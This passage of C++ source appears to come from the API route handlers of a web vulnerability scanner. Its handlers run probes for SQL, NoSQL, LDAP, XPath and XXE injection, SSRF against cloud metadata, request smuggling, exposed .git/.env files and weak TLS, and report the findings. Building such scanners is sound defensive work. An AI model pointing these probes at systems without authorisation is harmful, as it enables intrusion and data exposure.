            hits.append(QJsonObject{
                { "extension", h.extension }, { "probePath", h.probePath },
                { "cacheable", h.cacheable }, { "detail", h.detail } });
        }
        if (m_wiring.scanner && !cres.hits.isEmpty())
            m_wiring.scanner->reportFinding(0, anyCacheable ? "high" : "medium",
                "web-cache-deception",
                QString("Web cache deception on %1 -- the page is served at a static-extension URL%2")
                    .arg(cr.basePath, anyCacheable ? " with cache headers" : ""),
                "path confusion: " + cres.hits.first().detail
                    + " (a cache keyed on extension would store this per-user page)",
                cr.host, url);
        return okJson({{ "ok", cres.error.isEmpty() },
                       { "error", cres.error },
                       { "baselineStatus", cres.baselineStatus },
                       { "requestsSent", cres.requestsSent },
                       { "anyCacheable", anyCacheable },
                       { "catchAll", cres.catchAll },
                       { "hitCount", static_cast<int>(cres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Sensitive file / path exposure ------------------------------
    // POST /api/exposure/scan { url }
    //   Probes curated sensitive paths (.git/.env/actuator/...), confirmed by
    //   content signature. CWE-538/552. Read-only.
    if (path == "/api/exposure/scan") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::ExposureScan::Request er;
        er.host = u.host();
        er.port = u.port(u.scheme() == "https" ? 443 : 80);
        er.tls  = (u.scheme() == "https");
        const QString p = u.path(QUrl::FullyEncoded);
        if (p.length() > 1) er.basePrefix = p.endsWith('/') ? p.left(p.length() - 1) : p;
        const QJsonObject ehdrs = bodyJson.value("headers").toObject();
        for (auto it = ehdrs.begin(); it != ehdrs.end(); ++it)
            er.headers.append({ it.key(), it.value().toString() });

        const auto eres = Nullock::Core::ExposureScan::scan(er);
        QJsonArray hits;
        for (const auto &h : eres.hits) {
            hits.append(QJsonObject{
                { "path", h.path }, { "severity", h.severity },
                { "summary", h.summary }, { "status", h.status }, { "evidence", h.evidence } });
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, h.severity, "sensitive-file-exposure",
                    QString("Exposed %1 -- %2").arg(h.path, h.summary),
                    "confirmed by content signature: " + h.evidence,
                    er.host, url + h.path.mid(h.path.startsWith('/') ? 1 : 0));
        }
        return okJson({{ "ok", eres.error.isEmpty() },
                       { "error", eres.error },
                       { "probed", eres.probed },
                       { "catchAll", eres.catchAll },
                       { "hitCount", static_cast<int>(eres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- robots.txt / sitemap recon ----------------------------------
    // POST /api/robots/scan { url }
    //   Fetches /robots.txt + /sitemap.xml and surfaces Disallow paths (hidden
    //   attack surface) as recon findings, plus sitemap URLs. Read-only.
    if (path == "/api/robots/scan") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});
        if (u.scheme() != "http" && u.scheme() != "https")
            return okJson({{ "ok", false }, { "error", "url scheme must be http or https" }});

        Nullock::Core::RobotsRecon::Request rr;
        rr.host = u.host();
        rr.tls  = (u.scheme() == "https");
        rr.port = u.port(rr.tls ? 443 : 80);
        const QJsonObject rhdrs = bodyJson.value("headers").toObject();
        for (auto it = rhdrs.begin(); it != rhdrs.end(); ++it)
            rr.headers.append({ it.key(), it.value().toString() });

        const auto res = Nullock::Core::RobotsRecon::scan(rr);
        const QString scheme = rr.tls ? QStringLiteral("https") : QStringLiteral("http");
        const bool defPort = (rr.tls && rr.port == 443) || (!rr.tls && rr.port == 80);
        const QString origin = scheme + "://" + rr.host
            + (defPort ? QString() : ":" + QString::number(rr.port));

        int emitted = 0;
        const int kCap = 50;   // don't flood the findings list
        for (const QString &p : res.disallowed) {
            if (emitted >= kCap) break;
            ++emitted;
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, "info", "robots-disallowed-path",
                    "robots.txt Disallow: " + p,
                    "Crawler-hidden path -- review for unlinked admin/backup/internal content.",
                    rr.host, origin + (p.startsWith('/') ? p : "/" + p));
        }

        return okJson({
            { "ok", res.error.isEmpty() },
            { "error", res.error },
            { "host", res.host },
            { "robotsFound", res.robotsFound },
            { "sitemapFound", res.sitemapFound },
            { "disallowedCount", res.disallowed.size() },
            { "disallowed", QJsonArray::fromStringList(res.disallowed) },
            { "sitemapRefs", QJsonArray::fromStringList(res.sitemapRefs) },
            { "sitemapUrlCount", res.sitemapUrls.size() },
            { "sitemapUrls", QJsonArray::fromStringList(res.sitemapUrls) },
            { "findingsEmitted", emitted },
        });
    }

    // ---- WAF / CDN detection -----------------------------------------
    // POST /api/waf/detect { url }
    //   Identifies protective infrastructure (WAF/CDN/LB) from response header
    //   and cookie signatures on a normal GET. Passive -- no attack payload.
    if (path == "/api/waf/detect") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});
        if (u.scheme() != "http" && u.scheme() != "https")
            return okJson({{ "ok", false }, { "error", "url scheme must be http or https" }});

        Nullock::Core::WafDetect::Request wr;
        wr.host = u.host();
        wr.tls  = (u.scheme() == "https");
        wr.port = u.port(wr.tls ? 443 : 80);
        wr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        const QJsonObject whdrs = bodyJson.value("headers").toObject();
        for (auto it = whdrs.begin(); it != whdrs.end(); ++it)
            wr.headers.append({ it.key(), it.value().toString() });

        const auto res = Nullock::Core::WafDetect::detect(wr);
        QJsonArray dets;
        for (const auto &d : res.detections) {
            dets.append(QJsonObject{
                { "name", d.name }, { "kind", d.kind }, { "evidence", d.evidence } });
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, "info", "waf-detected",
                    d.kind.toUpper() + " detected: " + d.name,
                    "matched on " + d.evidence, wr.host, url);
        }
        return okJson({
            { "ok", res.error.isEmpty() },
            { "error", res.error },
            { "host", res.host },
            { "status", res.status },
            { "detectionCount", res.detections.size() },
            { "detections", dets },
        });
    }

    // ---- Subdomain-takeover detection --------------------------------
    // POST /api/takeover/test { url | host }
    //   Fetches the host and matches dangling-service fingerprints. CWE-284.
    if (path == "/api/takeover/test") {
        QString host = bodyJson.value("host").toString();
        Nullock::Core::TakeoverScan::Request tr;
        if (!host.isEmpty()) { tr.host = host; tr.tls = bodyJson.value("tls").toBool(true);
                               tr.port = bodyJson.value("port").toInt(tr.tls ? 443 : 80); }
        else {
            const QUrl u(bodyJson.value("url").toString());
            if (!u.isValid() || u.host().isEmpty())
                return okJson({{ "ok", false }, { "error", "valid url or host required" }});
            tr.host = u.host(); tr.tls = (u.scheme() != "http");
            tr.port = u.port(tr.tls ? 443 : 80);
            tr.basePath = u.path(QUrl::FullyEncoded).isEmpty() ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
            host = tr.host;
        }

        const auto tres = Nullock::Core::TakeoverScan::scan(tr);
        QJsonArray hits;
        for (const auto &h : tres.hits) {
            hits.append(QJsonObject{
                { "service", h.service }, { "evidence", h.evidence }, { "confidence", h.confidence } });
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, h.confidence == "high" ? "high" : "medium",
                    "subdomain-takeover",
                    QString("Possible subdomain takeover on %1 -- dangling %2").arg(host, h.service),
                    "matched fingerprint: " + h.evidence + " (confirm the CNAME points to the unclaimed service)",
                    host, host);
        }
        return okJson({{ "ok", tres.error.isEmpty() },
                       { "error", tres.error },
                       { "status", tres.status },
                       { "hitCount", static_cast<int>(tres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- HTTP method audit -------------------------------------------
    // POST /api/methods/test { url, headers? }
    //   Reads OPTIONS Allow + a TRACE echo probe; flags dangerous write/WebDAV
    //   methods and Cross-Site Tracing. Read-only. CWE-650.
    if (path == "/api/methods/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::MethodAudit::Request mr;
        mr.host = u.host();
        mr.port = u.port(u.scheme() == "https" ? 443 : 80);
        mr.tls  = (u.scheme() == "https");
        mr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        mr.query = u.query(QUrl::FullyEncoded);
        const QJsonObject mhdrs = bodyJson.value("headers").toObject();
        for (auto it = mhdrs.begin(); it != mhdrs.end(); ++it)
            mr.headers.append({ it.key(), it.value().toString() });

        const auto mres = Nullock::Core::MethodAudit::audit(mr);

        QJsonArray findings;
        for (const auto &f : mres.findings) {
            findings.append(QJsonObject{
                { "kind", f.kind }, { "severity", f.severity }, { "detail", f.detail } });
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, f.severity, f.kind,
                    QString("HTTP methods on %1 -- %2").arg(mr.basePath, f.detail),
                    "allowed: " + mres.allowed.join(", "), mr.host, url);
        }
        return okJson({{ "ok", mres.error.isEmpty() },
                       { "error", mres.error },
                       { "optionsStatus", mres.optionsStatus },
                       { "allowed", QJsonArray::fromStringList(mres.allowed) },
                       { "traceEnabled", mres.traceEnabled },
                       { "findingCount", static_cast<int>(mres.findings.size()) },
                       { "findings", findings }});
    }

    // ---- HTTP technology fingerprint ---------------------------------
    // POST /api/fingerprint { url, headers? }
    //   Active tech detection from headers/cookies/body; versioned server/CMS
    //   detections are correlated against the CVE database.
    if (path == "/api/fingerprint") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::HttpFingerprint::Request fr;
        fr.host = u.host();
        fr.port = u.port(u.scheme() == "https" ? 443 : 80);
        fr.tls  = (u.scheme() == "https");
        fr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        fr.query = u.query(QUrl::FullyEncoded);
        const QJsonObject fhdrs = bodyJson.value("headers").toObject();
        for (auto it = fhdrs.begin(); it != fhdrs.end(); ++it)
            fr.headers.append({ it.key(), it.value().toString() });

        const auto fres = Nullock::Core::HttpFingerprint::fingerprint(fr);

        auto sevFor = [](double cvss) {
            if (cvss >= 9.0) return QStringLiteral("critical");
            if (cvss >= 7.0) return QStringLiteral("high");
            if (cvss >= 4.0) return QStringLiteral("medium");
            return cvss > 0.0 ? QStringLiteral("low") : QStringLiteral("medium");  // unscored-but-known -> medium
        };
        QJsonArray techs, cves;
        for (const auto &t : fres.tech) {
            techs.append(QJsonObject{
                { "name", t.name }, { "version", t.version },
                { "source", t.source }, { "cveKind", t.cveKind } });
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, "info", "tech-detected",
                    QString("Detected %1%2").arg(t.name, t.version.isEmpty() ? "" : " " + t.version),
                    "fingerprint source: " + t.source, fr.host, url);
            // Correlate versioned, CVE-trackable tech against the CVE database.
            if (!t.cveKind.isEmpty() && !t.version.isEmpty()) {
                for (const auto &m : Nullock::Core::CveDatabase::lookup(t.cveKind, t.name + " " + t.version)) {
                    cves.append(QJsonObject{
                        { "cveId", m.cveId }, { "tech", t.name + " " + t.version },
                        { "cvss", m.cvss }, { "summary", m.summary } });
                    if (m_wiring.scanner)
                        m_wiring.scanner->reportFinding(0, sevFor(m.cvss), "cve-correlated",
                            QString("%1 in %2 %3 -- %4").arg(m.cveId, t.name, t.version, m.summary),
                            QString("affected %1 | fix %2 | %3").arg(m.affectedRange, m.fixVersion, m.reference),
                            fr.host, url);
                }
            }
        }
        return okJson({{ "ok", fres.error.isEmpty() },
                       { "error", fres.error },
                       { "status", fres.status },
                       { "techCount", static_cast<int>(fres.tech.size()) },
                       { "tech", techs },
                       { "cves", cves }});
    }

    // ---- TLS / certificate inspection --------------------------------
    // POST /api/tls/inspect { host, port?, timeoutMs? }
    //   Reads the peer cert + negotiated protocol/cipher and flags weak TLS
    //   config (expired/self-signed/weak-key/hostname/legacy proto). CWE-295.
    if (path == "/api/tls/inspect") {
        const QString host = bodyJson.value("host").toString();
        if (host.isEmpty())
            return okJson({{ "ok", false }, { "error", "host required" }});

        Nullock::Core::TlsInspect::Request tr;
        tr.host = host;
        tr.port = bodyJson.value("port").toInt(443);
        tr.timeoutMs = bodyJson.value("timeoutMs").toInt(6000);
        tr.probeLegacyProtocols = bodyJson.value("probeLegacy").toBool(true);

        const auto tres = Nullock::Core::TlsInspect::inspect(tr);

        QJsonArray findings;
        for (const auto &f : tres.findings) {
            findings.append(QJsonObject{
                { "kind", f.kind }, { "severity", f.severity }, { "detail", f.detail } });
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, f.severity, f.kind,
                    QString("TLS on %1:%2 -- %3").arg(host).arg(tr.port).arg(f.detail),
                    QString("subject=%1 issuer=%2 proto=%3 cipher=%4")
                        .arg(tres.subject, tres.issuer, tres.negotiatedProtocol, tres.cipher),
                    host, host + ":" + QString::number(tr.port));
        }
        return okJson({{ "ok", tres.error.isEmpty() },
                       { "error", tres.error },
                       { "connected", tres.connected },
                       { "protocol", tres.negotiatedProtocol },
                       { "cipher", tres.cipher },
                       { "subject", tres.subject },
                       { "issuer", tres.issuer },
                       { "selfSigned", tres.selfSigned },
                       { "notAfter", tres.notAfter },
                       { "daysToExpiry", tres.daysToExpiry },
                       { "keyBits", tres.keyBits },
                       { "hostnameMatch", tres.hostnameMatch },
                       { "sans", QJsonArray::fromStringList(tres.sans) },
                       { "legacyProtocolsEnabled", QJsonArray::fromStringList(tres.legacyProtocolsEnabled) },
                       { "findingCount", static_cast<int>(tres.findings.size()) },
                       { "findings", findings }});
    }

    // ---- Service-version vulnerability matching ----------------------
    // POST /api/servicevulns/scan { host, ports?, timeoutMs? }
    //   Banner-grabs network services and matches their version against a
    //   curated CVE table (nmap `vulners` class). Read-only. CWE-1395.
    if (path == "/api/servicevulns/scan") {
        const QString host = bodyJson.value("host").toString();
        if (host.isEmpty())
            return okJson({{ "ok", false }, { "error", "host required" }});

        Nullock::Core::ServiceVulns::Request svr;
        svr.host = host;
        svr.timeoutMs = bodyJson.value("timeoutMs").toInt(1200);
        for (const QJsonValue &v : bodyJson.value("ports").toArray())
            svr.ports << v.toInt();

        const auto sres = Nullock::Core::ServiceVulns::scan(svr);

        auto sevFor = [](double cvss) {
            if (cvss >= 9.0) return QStringLiteral("critical");
            if (cvss >= 7.0) return QStringLiteral("high");
            if (cvss >= 4.0) return QStringLiteral("medium");
            return cvss > 0.0 ? QStringLiteral("low") : QStringLiteral("medium");  // unscored-but-known -> medium
        };
        QJsonArray hits;
        int cveHitCount = 0;
        for (const auto &h : sres.hits) {
            // Product recognized but the banner withheld its version -- an INFO
            // coverage-gap finding, NOT a CVE match. Surface it so an undisclosed
            // version isn't silently read as "patched".
            if (h.informational) {
                hits.append(QJsonObject{
                    { "port", h.port }, { "product", h.product }, { "version", QString() },
                    { "cveId", QString() }, { "cvss", 0.0 }, { "summary", h.summary },
                    { "banner", h.banner }, { "informational", true }, { "severity", QStringLiteral("info") } });
                if (m_wiring.scanner)
                    m_wiring.scanner->reportFinding(0, "info", "service-version-undisclosed",
                        QString("%1 on %2:%3 -- version not disclosed (coverage incomplete)")
                            .arg(h.product, host).arg(h.port),
                        QString("banner: %1 | product identified but no version in the banner "
                                "(e.g. ServerTokens Prod) -- CVE matching cannot confirm patched-vs-vulnerable; "
                                "verify the running version manually").arg(h.banner),
                        host, host + ":" + QString::number(h.port));
                continue;
            }
            // An imprecise match (scanned version less precise than the CVE's
            // range boundary) can't confirm affected-vs-patched -- grade it a
            // LEAD (capped at medium), never a confirmed critical.
            ++cveHitCount;
            QString sev = sevFor(h.cvss);
            if (!h.precise && (sev == "critical" || sev == "high")) sev = QStringLiteral("medium");
            hits.append(QJsonObject{
                { "port", h.port }, { "product", h.product }, { "version", h.version },
                { "cveId", h.cveId }, { "cvss", h.cvss }, { "summary", h.summary },
                { "affected", h.affected }, { "fix", h.fix }, { "reference", h.reference },
                { "banner", h.banner }, { "precise", h.precise }, { "severity", sev } });
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, sev, "cve-correlated",
                    QString("%1%2 on %3:%4 (%5) -- %6")
                        .arg(h.precise ? QString() : QStringLiteral("POSSIBLE — "),
                             h.cveId, host).arg(h.port).arg(h.product + " " + h.version, h.summary),
                    QString("banner: %1 | affected %2 | fix %3 | %4%5")
                        .arg(h.banner, h.affected, h.fix, h.reference,
                             h.precise ? QString() : QStringLiteral(" | NOTE: version less precise than the affected range (patch level not disclosed) -- confirm the exact build")),
                    host, host + ":" + QString::number(h.port));
        }
        return okJson({{ "ok", sres.error.isEmpty() },
                       { "error", sres.error },
                       { "host", sres.host },
                       { "portsProbed", sres.portsProbed },
                       { "banners", sres.banners },
                       { "hitCount", cveHitCount },
                       { "hits", hits }});
    }

    // ---- HTTP request smuggling --------------------------------------
    // POST /api/smuggle/test { url, headers? }
    //   Times CL.TE and TE.CL desync probes against a baseline; flags a
    //   variant whose response is delayed (reproducibly). CWE-444. Slow by
    //   design -- a vulnerable host blocks until its socket timeout.
    if (path == "/api/smuggle/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::Smuggling::Request sr;
        sr.host = u.host();
        sr.port = u.port(u.scheme() == "https" ? 443 : 80);
        sr.tls  = (u.scheme() == "https");
        sr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        const QJsonObject shdrs = bodyJson.value("headers").toObject();
        for (auto it = shdrs.begin(); it != shdrs.end(); ++it)
            sr.headers.append({ it.key(), it.value().toString() });

        const auto sres = Nullock::Core::Smuggling::test(sr);

        QJsonArray hits;
        for (const auto &h : sres.hits)
            hits.append(QJsonObject{ { "variant", h.variant }, { "delayMs", h.delayMs } });
        if (m_wiring.scanner && sres.vulnerable)
            m_wiring.scanner->reportFinding(0, "critical", "request-smuggling",
                QString("HTTP request smuggling (%1) -- a desync probe blocked the back-end (%2 ms over baseline)")
                    .arg(sres.hits.first().variant).arg(sres.hits.first().delayMs),
                "the front-end and back-end disagree on request length; the timing delay reproduced",
                u.host(), url);
        return okJson({{ "ok", sres.error.isEmpty() },
                       { "error", sres.error },
                       { "vulnerable", sres.vulnerable },
                       { "baselineMs", sres.baselineMs },
                       { "requestsSent", sres.requestsSent },
                       { "hitCount", static_cast<int>(sres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- NoSQL injection ---------------------------------------------
    // POST /api/nosqli/test { url, param?, method?, headers? }
    //   Probes literal vs $ne vs $eq operator variants; confirms when the
    //   operator was interpreted (the differential). CWE-943.
    if (path == "/api/nosqli/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::NoSqlInjection::Request nr;
        nr.host = u.host();
        nr.port = u.port(u.scheme() == "https" ? 443 : 80);
        nr.tls  = (u.scheme() == "https");
        nr.method = httpMethodFromJson(bodyJson, "GET");
        nr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        nr.query = u.query(QUrl::FullyEncoded);
        nr.param = bodyJson.value("param").toString();
        const QJsonObject nhdrs = bodyJson.value("headers").toObject();
        for (auto it = nhdrs.begin(); it != nhdrs.end(); ++it)
            nr.headers.append({ it.key(), it.value().toString() });

        const auto nres = Nullock::Core::NoSqlInjection::test(nr);

        QJsonArray hits;
        QStringList where;
        for (const auto &h : nres.hits) {
            hits.append(QJsonObject{ { "param", h.param }, { "detail", h.detail } });
            where << h.param;
        }
        if (m_wiring.scanner && nres.vulnerable)
            m_wiring.scanner->reportFinding(0, "high", "nosql-injection",
                QString("NoSQL operator injection in '%1' -- a query operator was interpreted")
                    .arg(nres.hits.first().param),
                "literal/$ne/$eq differential confirms the operator: " + nres.hits.first().detail,
                u.host(), url);
        return okJson({{ "ok", nres.error.isEmpty() },
                       { "error", nres.error },
                       { "vulnerable", nres.vulnerable },
                       { "baselineStatus", nres.baselineStatus },
                       { "requestsSent", nres.requestsSent },
                       { "testedParams", QJsonArray::fromStringList(nres.testedParams) },
                       { "droppedParams", QJsonArray::fromStringList(nres.droppedParams) },
                       { "hitCount", static_cast<int>(nres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- XXE (XML external entity) -----------------------------------
    // POST /api/xxe/test { url, method?, contentType?, headers? }
    //   POSTs an XML body whose external entity targets a local file; confirms
    //   by the file's content signature in the response. CWE-611.
    if (path == "/api/xxe/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::XxeInjection::Request xr;
        xr.host = u.host();
        xr.port = u.port(u.scheme() == "https" ? 443 : 80);
        xr.tls  = (u.scheme() == "https");
        xr.method = httpMethodFromJson(bodyJson, "POST");
        xr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        xr.contentType = contentTypeFromJson(bodyJson);
        const QJsonObject xhdrs = bodyJson.value("headers").toObject();
        for (auto it = xhdrs.begin(); it != xhdrs.end(); ++it)
            xr.headers.append({ it.key(), it.value().toString() });

        const auto xres = Nullock::Core::XxeInjection::test(xr);

        QJsonArray hits;
        for (const auto &h : xres.hits)
            hits.append(QJsonObject{
                { "technique", h.technique }, { "target", h.target },
                { "evidence", h.evidence } });
        if (m_wiring.scanner && xres.vulnerable)
            m_wiring.scanner->reportFinding(0, "critical", "xxe-injection",
                QString("XXE: the XML parser resolved an external entity reading %1")
                    .arg(xres.hits.first().target),
                "an injected external entity returned the target file's content: " + xres.hits.first().evidence,
                u.host(), url);
        return okJson({{ "ok", xres.error.isEmpty() },
                       { "error", xres.error },
                       { "vulnerable", xres.vulnerable },
                       { "baselineStatus", xres.baselineStatus },
                       { "requestsSent", xres.requestsSent },
                       { "hitCount", static_cast<int>(xres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- SQL injection (error-based) ---------------------------------
    // POST /api/sqli/test { url, param?, method?, headers? }
    //   Injects syntax-breaking quotes; confirms by a DBMS error absent from
    //   the baseline and cleared by a balanced quote. CWE-89.
    if (path == "/api/sqli/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::SqlInjection::Request sr;
        sr.host = u.host();
        sr.port = u.port(u.scheme() == "https" ? 443 : 80);
        sr.tls  = (u.scheme() == "https");
        sr.method = httpMethodFromJson(bodyJson, "GET");
        sr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        sr.query = u.query(QUrl::FullyEncoded);
        sr.param = bodyJson.value("param").toString();
        sr.timeBased = bodyJson.value("blind").toBool(false);   // opt-in blind time-based (slow)
        const QJsonObject shdrs = bodyJson.value("headers").toObject();
        for (auto it = shdrs.begin(); it != shdrs.end(); ++it)
            sr.headers.append({ it.key(), it.value().toString() });

        const auto sres = Nullock::Core::SqlInjection::test(sr);

        QJsonArray hits;
        QStringList where;
        for (const auto &h : sres.hits) {
            hits.append(QJsonObject{
                { "param", h.param }, { "dbms", h.dbms },
                { "technique", h.technique },
                { "payload", h.payload }, { "evidence", h.evidence } });
            where << h.param + " (" + h.dbms + "/" + h.technique + ")";
        }
        if (m_wiring.scanner && sres.vulnerable) {
            // A DBMS-specific fingerprint is critical; a generic-signature-only
            // match is high (could be a non-DB error page) -- confirm manually.
            const bool specific = (sres.hits.first().dbms != "generic");
            m_wiring.scanner->reportFinding(0, specific ? "critical" : "high", "sql-injection",
                QString("SQL injection in '%1' (%2) -- a quote broke the query syntax")
                    .arg(sres.hits.first().param, sres.hits.first().dbms),
                "the database returned a syntax error on an injected quote, cleared by a "
                "balanced quote: " + sres.hits.first().evidence,
                u.host(), url);
        }
        return okJson({{ "ok", sres.error.isEmpty() },
                       { "error", sres.error },
                       { "vulnerable", sres.vulnerable },
                       { "baselineStatus", sres.baselineStatus },
                       { "requestsSent", sres.requestsSent },
                       { "testedParams", QJsonArray::fromStringList(sres.testedParams) },
                       { "droppedParams", QJsonArray::fromStringList(sres.droppedParams) },
                       { "hitCount", static_cast<int>(sres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- LDAP injection ----------------------------------------------
    // POST /api/ldapi/test { url, param?, method?, headers? }
    //   Injects filter-breaking metacharacters; confirms by an LDAP error
    //   absent from the baseline and absent under a benign value. CWE-90.
    if (path == "/api/ldapi/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::LdapInjection::Request lr;
        lr.host = u.host();
        lr.port = u.port(u.scheme() == "https" ? 443 : 80);
        lr.tls  = (u.scheme() == "https");
        lr.method = httpMethodFromJson(bodyJson, "GET");
        lr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        lr.query = u.query(QUrl::FullyEncoded);
        lr.param = bodyJson.value("param").toString();
        const QJsonObject lhdrs = bodyJson.value("headers").toObject();
        for (auto it = lhdrs.begin(); it != lhdrs.end(); ++it)
            lr.headers.append({ it.key(), it.value().toString() });

        const auto lres = Nullock::Core::LdapInjection::test(lr);

        QJsonArray hits;
        for (const auto &h : lres.hits)
            hits.append(QJsonObject{
                { "param", h.param }, { "engine", h.engine },
                { "payload", h.payload }, { "evidence", h.evidence } });
        if (m_wiring.scanner && lres.vulnerable)
            m_wiring.scanner->reportFinding(0, "high", "ldap-injection",
                QString("LDAP injection in '%1' (%2) -- a filter metacharacter broke the search filter")
                    .arg(lres.hits.first().param, lres.hits.first().engine),
                "the directory returned a filter error on an injected metacharacter, "
                "absent under a benign value: " + lres.hits.first().evidence,
                u.host(), url);
        return okJson({{ "ok", lres.error.isEmpty() },
                       { "error", lres.error },
                       { "vulnerable", lres.vulnerable },
                       { "baselineStatus", lres.baselineStatus },
                       { "requestsSent", lres.requestsSent },
                       { "testedParams", QJsonArray::fromStringList(lres.testedParams) },
                       { "droppedParams", QJsonArray::fromStringList(lres.droppedParams) },
                       { "hitCount", static_cast<int>(lres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- XPath injection ---------------------------------------------
    // POST /api/xpathi/test { url, param?, method?, headers? }
    //   Injects expression-breaking metacharacters; confirms by an XPath error
    //   absent from the baseline and absent under a benign value. CWE-643.
    if (path == "/api/xpathi/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::XpathInjection::Request xr;
        xr.host = u.host();
        xr.port = u.port(u.scheme() == "https" ? 443 : 80);
        xr.tls  = (u.scheme() == "https");
        xr.method = httpMethodFromJson(bodyJson, "GET");
        xr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        xr.query = u.query(QUrl::FullyEncoded);
        xr.param = bodyJson.value("param").toString();
        const QJsonObject xhdrs = bodyJson.value("headers").toObject();
        for (auto it = xhdrs.begin(); it != xhdrs.end(); ++it)
            xr.headers.append({ it.key(), it.value().toString() });

        const auto xres = Nullock::Core::XpathInjection::test(xr);

        QJsonArray hits;
        for (const auto &h : xres.hits)
            hits.append(QJsonObject{
                { "param", h.param }, { "engine", h.engine },
                { "payload", h.payload }, { "evidence", h.evidence } });
        if (m_wiring.scanner && xres.vulnerable)
            m_wiring.scanner->reportFinding(0, "high", "xpath-injection",
                QString("XPath injection in '%1' (%2) -- a metacharacter broke the XPath expression")
                    .arg(xres.hits.first().param, xres.hits.first().engine),
                "the XPath engine returned an expression error on an injected metacharacter, "
                "absent under a benign value: " + xres.hits.first().evidence,
                u.host(), url);
        return okJson({{ "ok", xres.error.isEmpty() },
                       { "error", xres.error },
                       { "vulnerable", xres.vulnerable },
                       { "baselineStatus", xres.baselineStatus },
                       { "requestsSent", xres.requestsSent },
                       { "testedParams", QJsonArray::fromStringList(xres.testedParams) },
                       { "droppedParams", QJsonArray::fromStringList(xres.droppedParams) },
                       { "hitCount", static_cast<int>(xres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- SSRF (in-band: cloud metadata + file / internal) ------------
    // POST /api/ssrf/test { url, param?, method?, headers? }
    //   Injects metadata/file URLs; confirms only on a response-only
    //   signature absent from the baseline (reflection-proof). CWE-918.
    //   Blind/OOB SSRF is the parameter-sweep + OAST correlator's job.
    if (path == "/api/ssrf/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::SsrfScan::Request sr;
        sr.host = u.host();
        sr.port = u.port(u.scheme() == "https" ? 443 : 80);
        sr.tls  = (u.scheme() == "https");
        sr.method = httpMethodFromJson(bodyJson, "GET");
        sr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        sr.query = u.query(QUrl::FullyEncoded);
        sr.param = bodyJson.value("param").toString();
        const QJsonObject shdrs = bodyJson.value("headers").toObject();
